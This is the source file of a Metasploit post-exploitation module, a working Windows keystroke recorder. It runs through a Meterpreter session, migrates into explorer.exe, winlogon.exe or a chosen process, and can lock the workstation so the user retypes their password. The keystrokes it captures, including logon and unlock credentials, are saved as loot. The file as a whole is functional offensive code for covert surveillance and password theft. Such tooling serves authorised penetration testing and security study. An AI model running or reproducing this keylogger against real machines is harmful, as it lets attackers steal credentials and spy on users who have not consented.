##
# ## This file is part of the Metasploit Framework and may be subject to
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'           => 'Windows Capture Keystroke Recorder',
        'Description'    => %q{
          This module can be used to capture keystrokes. To capture keystrokes when the session is running
          as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of
          Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the
          Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session
          to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon
          option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
          option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
          password.
            },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'       => [ 'win' ],
        'SessionTypes'   => [ 'meterpreter', ]

      ))
    register_options(
      [
        OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
        OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes', 5]),
        OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
        OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                'explorer', ['explorer','winlogon','pid']])

      ], self.class)
    register_advanced_options(
      [
        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run

    print_status("Executing module against #{sysinfo['Computer']}")
    if datastore['MIGRATE']
      case datastore['CAPTURE_TYPE']
      when "explorer"
        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
      when "winlogon"
        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
      when "pid"
        if datastore['PID'] and has_pid?(datastore['PID'])
          pid_migrate(datastore['PID'])
        else
          print_error("If capture type is pid you must provide a valid one")
          return
        end
      end

    end

    if startkeylogger
      keycap(datastore['INTERVAL'],set_log)
    end
  end

  # Returns the path name to the stored loot filename
  def set_log
    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")
  end

  def lock_screen
    print_status("Locking the desktop...")
    lock_info = session.railgun.user32.LockWorkStation()
    if lock_info["GetLastError"] == 0
      print_status("Screen has been locked")
    else
      print_error("Screen lock failed")
    end
  end

  # Method to Migrate in to Explorer process to be able to interact with desktop
  def process_migrate(captype,lock)
    print_status("Migration type #{captype}")
    #begin
    if captype == "explorer"
      process2mig = "explorer.exe"
    elsif captype == "winlogon"
      if is_uac_enabled? and not is_admin?
        print_error("UAC is enabled on this host! Winlogon migration will be blocked.")

      end
      process2mig = "winlogon.exe"
      if lock
        lock_screen
      end
    else
      process2mig = "explorer.exe"
    end
    # Actual migration
    mypid = session.sys.process.getpid
    session.sys.process.get_processes().each do |x|
      if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
        print_status("\t#{process2mig} Process found, migrating into #{x['pid']}...")
        session.core.migrate(x['pid'].to_i)
        print_status("Migration successful!!")
      end
    end
    return true
  end

  # Method for migrating in to a PID
  def pid_migrate(pid)
    print_status("\tMigrating into #{pid}...")
    session.core.migrate(pid)
    print_status("Migration successful!")
  end

  # Method for starting the keylogger
  def startkeylogger()
    begin
      #print_status("Grabbing Desktop Keyboard Input...")
      #session.ui.grab_desktop
      print_status("Starting the keystroke sniffer...")
      session.ui.keyscan_start
      return true
    rescue
      print_error("Failed to start the keystroke sniffer: #{$!}")
      return false
    end
  end

  # Method for writing found keystrokes
  def write_keylog_data(logfile)
    data = session.ui.keyscan_dump
    outp = ""
    data.unpack("n*").each do |inp|
      fl = (inp & 0xff00) >> 8
      vk = (inp & 0xff)
      kc = VirtualKeyCodes[vk]

      f_shift = fl & (1<<1)
      f_ctrl  = fl & (1<<2)
      f_alt   = fl & (1<<3)

      if(kc)
        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
        case name
        when /^.$/
          outp << name
        when /shift|click/i
        when 'Space'
          outp << " "
        else
          outp << " <#{name}> "
        end
      else
        outp << " <0x%.2x> " % vk
      end
    end

    sleep(2)
    if not outp.empty?
      print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
      file_local_write(logfile,"#{outp}\n")
    end
  end

  # Method for Collecting Capture
  def keycap(keytime, logfile)
    begin
      rec = 1
      #Creating DB for captured keystrokes
      print_status("Keystrokes being saved in to #{logfile}")
      #Inserting keystrokes every number of seconds specified
      print_status("Recording keystrokes...")
      while rec == 1
        write_keylog_data(logfile)
        sleep(keytime.to_i)
      end
    rescue::Exception => e
      print_status "Saving last few keystrokes..."
      write_keylog_data(logfile)
      print_status("#{e.class} #{e}")
      print_status("Stopping keystroke sniffer...")
      session.ui.keyscan_stop
    end
  end

  def cleanup
    session.ui.keyscan_stop rescue nil
  end

end
